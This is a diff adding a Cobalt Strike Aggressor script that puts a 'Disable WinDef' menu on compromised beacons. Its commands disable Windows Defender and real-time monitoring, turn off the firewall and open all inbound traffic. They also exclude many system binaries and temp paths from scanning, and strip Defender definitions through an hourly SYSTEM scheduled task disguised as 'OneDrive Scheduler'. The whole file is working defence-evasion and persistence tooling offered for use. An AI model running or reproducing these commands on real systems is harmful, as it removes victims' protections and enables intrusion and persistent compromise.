@@ -1,0 +1,100 @@
+
+# create a popup menu!
+popup beacon_bottom {
+	menu "Disable WinDef" {
+		item "* Disable AV/Firewall" {
+			# Beacon ID
+			$bid = $1;
+
+			# Antivirus
+			bshell($bid, "sc config WinDefend start= disabled");
+			bshell($bid, "sc stop WinDefend");
+			bpowershell($bid, "Set-MpPreference -DisableRealtimeMonitoring \$true");
+
+			# Firewall
+			bshell($bid, "NetSh Advfirewall set allprofiles state off");
+			bpowershell($bid, "New-NetFirewallRule -Name DefaultRule -DisplayName DefaultRule -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ANY");			
+		}
+
+		item "* Add Exclusions (Auto)" {
+			# Beacon ID
+			$bid = $1;
+
+			# Lists (TO BE UPDATED)
+			$path_list = @("C:\\Windows\\Temp", "C:\\Windows\\Tasks", "C:\\Windows\\debug", "C:\\Windows\\Logs", "C:\\Users\\Default\\AppData\\Roaming", "C:\\Users\\Default\\AppData\\Local\\Temp", "C:\\ProgramData\\Microsoft\\Windows\\Templates", "C:\\ProgramData\\Microsoft\\Windows\\Caches");
+			$exe_list = @("Atbroker.exe", "Bash.exe", "Bitsadmin.exe", "Certutil.exe", "Cmdkey.exe", "Cmstp.exe", "Control.exe", "Csc.exe", "Cscript.exe", "Dfsvc.exe", "Diskshadow.exe", "Dnscmd.exe", "Esentutl.exe", "Extexport.exe", "Extrac32.exe", "Expand.exe", "Explorer.exe", "Findstr.exe", "Forfiles.exe", "Gpscript.exe", "Hh.exe", "Ieexec.exe", "Ie4uinit.exe", "Infdefaultinstall.exe", "Installutil.exe", "Makecab.exe", "Mavinject.exe", "Msbuild.exe", "Msconfig.exe", "Msdt.exe", "Mshta.exe", "Msiexec.exe", "Netsh.exe", "Nltest.exe", "Odbcconf.exe", "Openwith.exe", "Pcalua.exe", "Pcwrun.exe", "Powershell.exe", "Presentationhost.exe", "Print.exe", "Psr.exe", "Reg.exe", "Regedit.exe", "Regasm.exe", "Register-cimprovider.exe", "Regsvcs.exe", "Regsvr32.exe", "Replace.exe", "Robocopy.exe", "Rpcping.exe", "Rundll32.exe", "Runonce.exe", "Runscripthelper.exe", "Sc.exe", "Scriptrunner.exe", "Syncappvpublishingserver.exe", "Wab.exe", "Wmic.exe", "Wscript.exe", "Xwizard.exe", "Appvlp.exe", "Bginfo.exe", "Cdb.exe", "Csi.exe", "Dnx.exe", "Dxcap.exe", "Mftrace.exe", "Msdeploy.exe", "Msxsl.exe", "Rcsi.exe", "Sqldumper.exe", "Sqlps.exe", "Sqltoolsps.exe", "Te.exe", "Tracker.exe", "Vsjitdebugger.exe", "Winword.exe", "AcroRd32.exe", "Gpup.exe", "Nlnotes.exe", "Notes.exe", "Nvuhda6.exe", "Nvudisp.exe", "VBoxDrvInst.exe", "Usbinst.exe", "Setup.exe", "svchost.exe");
+
+			# Set exclusions
+			bpowershell($bid, "Add-MpPreference -ExclusionPath " . $path_list);
+			bpowershell($bid, "Add-MpPreference -ExclusionProcess " . $exe_list);
+		}
+
+		item "* Add Exclusions (Custom)" {
+			local('$dialog %defaults');
+
+			# Beacon ID
+			$bid = $1;
+
+			%defaults["processes"] = "";
+			%defaults["paths"] = "";
+
+			# create our dialog
+			$dialog = dialog("Add Exclusions (Custom)", %defaults, lambda({
+				$options = $3;
+				$processes = $options["processes"];
+				$paths = $options["paths"];
+
+				bpowershell($bid, "Add-MpPreference -ExclusionPath " . $paths);
+				bpowershell($bid, "Add-MpPreference -ExclusionProcess " . $processes);
+			}));
+
+			dialog_description($dialog, "Set Exclusions (Custom)");
+			drow_text($dialog, "processes", "Processes: ");
+			drow_text($dialog, "paths", "Paths: ");
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+
+		item "* Add Exclusions (Extensions)" {
+			local('$dialog %defaults');
+
+			# Beacon ID
+			$bid = $1;
+
+			%defaults["ext"] = "exe";
+
+			# create our dialog
+			$dialog = dialog("Add Exclusions (Custom)", %defaults, lambda({
+				$options = $3;
+				$ext = $options["ext"];
+
+				bpowershell($bid, "Add-MpPreference -ExclusionExtension " . $ext);
+			}));
+
+			dialog_description($dialog, "Set Exclusions (Custom)");
+			drow_text($dialog, "ext", "Extensions: ");
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+
+		item "* Remove Definitions" {
+			# Beacon ID
+			$bid = $1;
+
+			# Execute
+			bshell($bid, "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All");
+
+			# Add hourly scheduled task
+			$name = "OneDrive Scheduler";
+			$command_hourly = "schtasks /create /sc HOURLY /ru \"SYSTEM\" /tn \"" . $name . "\" /tr \"C:\\Program Files\\Windows Defender\\MpCmdRun.exe -RemoveDefinitions -All\"";
+			bshell($bid, $command_hourly);
+		}
+
+	}
+		
+}
+
